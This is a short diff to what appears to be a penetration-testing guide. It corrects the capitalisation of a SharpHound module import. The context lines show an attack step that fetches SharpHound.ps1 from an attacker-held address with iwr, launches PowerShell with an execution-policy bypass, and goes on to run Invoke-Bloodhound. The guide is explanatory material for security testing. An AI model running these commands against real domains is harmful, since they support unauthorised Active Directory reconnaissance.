@@ -14,7 +14,7 @@ iwr -uri http://$(IP_ADDRESS)/SharpHound.ps1 -OutFile SharpHound.ps1
 powershell -ep bypass
 ```
 ```powershell
-Import-Module .\Sharphound.ps1
+Import-Module .\SharpHound.ps1
 ```
 ### Step 3: Invoke-Bloodhound
 ```powershell
